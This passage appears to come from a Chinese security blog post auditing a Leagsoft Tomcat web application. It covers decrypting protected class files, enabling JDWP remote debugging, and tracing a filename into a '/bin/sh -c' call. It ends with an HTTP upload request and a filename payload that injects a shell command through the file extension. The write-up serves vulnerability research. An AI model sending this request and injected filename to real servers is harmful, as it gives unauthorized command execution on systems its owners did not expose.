</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (File classFile : fs){
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(classFile.<span style=color:#a6e22e>getAbsolutePath</span>());
</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(ENCRYPT_PATH, classFile.<span style=color:#a6e22e>getName</span>());
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> IoUtils.<span style=color:#a6e22e>readFileToByte</span>(file);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (bytes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> ;
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> pass <span style=color:#f92672>=</span> StrUtils.<span style=color:#a6e22e>merger</span>(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[][]</span>{password, classFile.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>toCharArray</span>()});
</span></span><span style=display:flex><span>                bytes <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>de</span>(bytes, pass, 1);
</span></span><span style=display:flex><span>                System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;正在解密... &#34;</span> <span style=color:#f92672>+</span> classFile.<span style=color:#a6e22e>getName</span>());
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span>{
</span></span><span style=display:flex><span>                    File outFile <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(DECRYPT_PATH<span style=color:#f92672>+</span> classFile.<span style=color:#a6e22e>getName</span>()<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;.class&#34;</span>);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>outFile.<span style=color:#a6e22e>exists</span>()){
</span></span><span style=display:flex><span>                        outFile.<span style=color:#a6e22e>createNewFile</span>();
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    FileOutputStream outputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(outFile);
</span></span><span style=display:flex><span>                    outputStream.<span style=color:#a6e22e>write</span>(bytes);
</span></span><span style=display:flex><span>                }<span style=color:#66d9ef>catch</span> (Exception e){
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/2024-07-29-caca69621b0ac31050dfbda096c260c6dbca086b742f059138ecda98f14935a6.png alt=9></p><p>跑一下Main方法就能将所有的加密class字节码文件还原，大功告成。</p><h3 id=远程调试tomcat>远程调试Tomcat</h3><p>修改Tomcat安装目录下<code>bin/catalina.sh</code> 文件，通过定义catalina的配置选项可以在tomcat启动时开启远程调试端口。</p><p>修改文件：<code>/home/leagsoft/SafeDataExchange/Apache/bin/catalina.sh</code></p><p><img src=https://images.payloads.online/2024-07-29-a569bb52b5db158da8c9ca25ec36e8386843cfdec60410570ab2ebc3945c73c8.png alt=10></p><p>加入内容：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>CATALINA_OPTS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:9999&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后重启tomcat就可以进行远程调试了。
<img src=https://images.payloads.online/2024-07-29-5286ff18ed77057ec7661589dae2390349c3688a64954c35f0addee8fa0ea1e2.png alt=15></p><p>打开idea，将原本没有方法实现的class替换为已经解密的class，添加远程调试配置：</p><p>这里我替换了：</p><p><code>WEB-INF/classes/com/leagsoft/nxg/dlp/controller/FileTrackMarkMessageController.class</code></p><p><img src=https://images.payloads.online/2024-07-29-291090c034eb14e7c54f6e8134dc4cffdc90c2caa137d8d9a3995cd5b2949607.png alt=11></p><p>添加一个调试配置，点击Edit Configurations：</p><p><img src=https://images.payloads.online/2024-07-29-72fed2f81a5857e1322cae31988c98a99f20535cf1df7489fba34e662dcb5e04.png alt=12></p><p>点击添加按钮，新增一个Remote配置：</p><p><img src=https://images.payloads.online/2024-07-29-5571001140fb45b5e6dd403647aee8c9bfffd6d485fa5a99810841f799c32665.png alt=13></p><p>填入远程调试的IP地址和端口：</p><p><img src=https://images.payloads.online/2024-07-29-470690a9c80ba81dce667b1dbc496df19c644658e99f5fe727cf52adc312dd2d.png alt=14></p><p>然后在要调试的方法下断点，点击调试按钮，控制台会提示已经连接到目标JVM：</p><p><img src=https://images.payloads.online/2024-07-29-caec6aa5c122933badd4c5d86d3cbfeaa93ac49c5d8055109b72018d7be87eda.png alt=16></p><p>当访问到对应的控制器，并且代码执行时，断点会生效：</p><p><img src=https://images.payloads.online/2024-07-29-b98190a484595ca8a2b7c07def77f2f5c12a80c12bf45c60bdb06e0c5a07e0a3.png alt=17></p><p>通过观察调用栈、局部变量的值可以很方便的帮助我们进行输入输出的判断。</p><h3 id=后台命令执行一>后台命令执行一</h3><p>通过审计发现<code>FileTrackMarkMessageController.class</code>中的<code>getUploadFileID</code> 方法调用了<code>Runtime.getRuntime().exec</code> 可能会存在命令执行漏洞。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>getUploadFileID</span>(HttpServletRequest request, HttpServletResponse response) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>FileItem<span style=color:#f92672>&gt;</span> fileList <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList();
</span></span><span style=display:flex><span>        ModelAndViewUtil.getMultiParamterMap(request, fileList);
</span></span><span style=display:flex><span>        String separator <span style=color:#f92672>=</span> File.separator;
</span></span><span style=display:flex><span>        File detect <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>detect.exists()) {
</span></span><span style=display:flex><span>            detect.mkdirs();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        JObject jo <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> JObject();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (fileList.size() <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            String fileID <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>            Iterator var8 <span style=color:#f92672>=</span> fileList.iterator();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span>(var8.hasNext()) {
</span></span><span style=display:flex><span>                FileItem file <span style=color:#f92672>=</span> (FileItem)var8.next();
</span></span><span style=display:flex><span>                String simpleName <span style=color:#f92672>=</span> SysUtils.getSimpleName(file.getName().replaceAll(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;/&#34;</span>));
</span></span><span style=display:flex><span>                file.write(<span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> simpleName));
</span></span><span style=display:flex><span>                String postfix <span style=color:#f92672>=</span> simpleName.substring(simpleName.lastIndexOf(<span style=color:#e6db74>&#34;.&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, simpleName.length());
</span></span><span style=display:flex><span>                String comd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;ClairDeLune printall &#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> simpleName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; &#34;</span> <span style=color:#f92672>+</span> postfix;
</span></span><span style=display:flex><span>                Process p <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>                String[] command <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String[]{<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, comd};
</span></span><span style=display:flex><span>                p <span style=color:#f92672>=</span> Runtime.getRuntime().exec(command);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                .......
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p>我们的输入点是request对象，它被传入了<code>getMultiParamterMap</code>方法，跟进查看：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> getMultiParamterMap(HttpServletRequest request, List<span style=color:#f92672>&lt;</span>FileItem<span style=color:#f92672>&gt;</span> fileList) <span style=color:#66d9ef>throws</span> FileUploadException {
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> param <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TreeMap();
</span></span><span style=display:flex><span>        FileItemFactory factory <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> DiskFileItemFactory();
</span></span><span style=display:flex><span>        ServletFileUpload upload <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ServletFileUpload(factory);
</span></span><span style=display:flex><span>        List items <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            items <span style=color:#f92672>=</span> upload.parseRequest(request);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception var10) {
</span></span><span style=display:flex><span>            LOG.error(var10.getMessage());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ......
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> param;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p><code>request</code> 被传入了<code>ServletFileUpload</code>，看来是一个文件上传的数据包。</p><p>构造一个文件上传的数据包发送过去调试看看：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>POST <span style=color:#f92672>/</span>UniEx<span style=color:#f92672>/</span>fileTrackMarkMessage<span style=color:#f92672>/</span>getUploadFileID.htm HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host: <span style=color:#ae81ff>192.168.117.100</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: <span style=color:#ae81ff>181</span>
</span></span><span style=display:flex><span>Cache<span style=color:#f92672>-</span>Control: max<span style=color:#f92672>-</span>age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua: <span style=color:#e6db74>&#34; Not A;Brand&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;99&#34;</span>, <span style=color:#e6db74>&#34;Chromium&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;96&#34;</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Mobile: <span style=color:#f92672>?</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Platform: <span style=color:#e6db74>&#34;macOS&#34;</span>
</span></span><span style=display:flex><span>Upgrade<span style=color:#f92672>-</span>Insecure<span style=color:#f92672>-</span>Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cookie: JSESSIONID<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>D3B2F3A86C3F73FC8FA267D3D5603D5;
</span></span><span style=display:flex><span>Referer: https:<span style=color:#75715e>//192.168.49.100/UniEx/login.jsp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Content<span style=color:#f92672>-</span>Type: multipart<span style=color:#f92672>/</span>form<span style=color:#f92672>-</span>data; boundary<span style=color:#f92672>=----</span>WebKitFormBoundarymo440JkALdwNUIKs
</span></span><span style=display:flex><span>User<span style=color:#f92672>-</span>Agent: Mozilla<span style=color:#f92672>/</span><span style=color:#ae81ff>5.0</span> (Windows NT <span style=color:#ae81ff>10.0</span>; Win64; x64) AppleWebKit<span style=color:#f92672>/</span><span style=color:#ae81ff>537.36</span> (KHTML, like Gecko) Chrome<span style=color:#f92672>/</span><span style=color:#ae81ff>96.0.4664.93</span> Safari<span style=color:#f92672>/</span><span style=color:#ae81ff>537.36</span>
</span></span><span style=display:flex><span>Accept: text<span style=color:#f92672>/</span>html,application<span style=color:#f92672>/</span>xhtml<span style=color:#f92672>+</span>xml,application<span style=color:#f92672>/</span>xml;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>,image<span style=color:#f92672>/</span>avif,image<span style=color:#f92672>/</span>webp,image<span style=color:#f92672>/</span>apng,<span style=color:#960050;background-color:#1e0010>*/</span><span style=color:#f92672>*</span>;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.8</span>,application<span style=color:#f92672>/</span><span style=color:#66d9ef>signed</span><span style=color:#f92672>-</span>exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Site: cross<span style=color:#f92672>-</span>site
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Mode: navigate
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>User: <span style=color:#f92672>?</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Dest: document
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Language: zh<span style=color:#f92672>-</span>CN,zh;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.9</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>------</span>WebKitFormBoundarymo440JkALdwNUIKs
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Disposition: form<span style=color:#f92672>-</span>data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.png&#34;</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: image<span style=color:#f92672>/</span>png
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span><span style=color:#f92672>------</span>WebKitFormBoundarymo440JkALdwNUIKs<span style=color:#f92672>--</span>
</span></span></code></pre></td></tr></table></div></div><p>此时局部变量的值：</p><p><img src=https://images.payloads.online/2024-07-29-6cdfbf06144d922718628f163f388c612fc310451acfd8da9b039989ec3b07fe.png alt=18></p><p>我发现文件名被带入了<code>/bin/sh -c</code> 意味着文件名也可以作为命令执行，由于前面有进行文件扩展名的获取解析，这个方法会取文件名的最后一个<code>.</code> 作为分割，把扩展名取得后拼接在最后面，最好的命令注入点是文件扩展名，最终我的payload如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>file.<span style=color:#e6db74>`</span>touch<span style=color:#e6db74>${</span>IFS<span style=color:#e6db74>}</span>222222<span style=color:#e6db74>`</span>
